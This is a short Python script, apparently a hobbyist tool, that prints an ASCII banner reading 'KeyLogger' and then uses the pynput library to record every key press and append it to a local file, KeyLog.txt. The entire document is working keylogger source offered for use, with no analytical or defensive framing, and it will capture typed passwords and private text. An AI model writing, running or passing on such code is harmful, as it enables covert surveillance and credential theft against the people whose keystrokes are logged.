#fancy ASCII text ...
import pyfiglet

print(pyfiglet.figlet_format("KeyLogger", font = "bulbhead" ).center(30))
print(pyfiglet.figlet_format("Created By @FaLLenGuY", font = "digital" ).ljust(30))
print("-"*70,"\n")

#import Libraries ...
from pynput.keyboard import Listener

#define a log Function to record/log keystrokes ...
def write_logs(key):
    keydata = str(key)
    keydata = keydata.replace("'","")

#write funtion to log Keystrokes ...
    with open ("KeyLog.txt","a") as file:
        file.write (keydata)

# create a listener to listen keystrokes ...

with Listener (on_press = write_logs) as listen :
    listen.join()
